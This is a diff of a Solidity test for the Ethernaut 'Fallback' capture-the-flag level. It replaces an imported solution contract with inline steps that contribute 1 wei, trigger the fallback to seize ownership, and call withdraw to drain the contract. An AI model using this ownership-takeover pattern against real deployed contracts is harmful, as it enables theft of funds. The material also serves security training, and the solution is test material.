@@ -5,7 +5,6 @@ import "ds-test/test.sol";
 import "forge-std/Vm.sol";
 import "../Ethernaut.sol";
 import "../Fallback/FallbackFactory.sol";
-import "../Fallback/FallbackSolution.sol";
 
 contract FallbackTest is DSTest {
     // 0x710... is a special address
@@ -27,10 +26,15 @@ contract FallbackTest is DSTest {
         ethernaut.registerLevel(fallbackFactory);
         vm.startPrank(eoaAddress);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
+        Fallback fallbackContract = Fallback(payable(levelAddress));
 
         // Solution
-        FallbackSolution fallbackSolution = FallbackSolution(levelAddress);
-        fallbackSolution.solve{value: 2 wei}();
+        fallbackContract.contribute{value: 1 wei}(); // contribute 1 wei
+        assertEq(fallbackContract.getContribution(), 1);
+        (bool success, bytes memory data) = address(fallbackContract).call{value: 1 wei}(""); // invoke fallback()
+        assert(success);
+        assertEq(fallbackContract.owner(), eoaAddress);
+        fallbackContract.withdraw(); // invoke withdraw
 
         // Submission
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
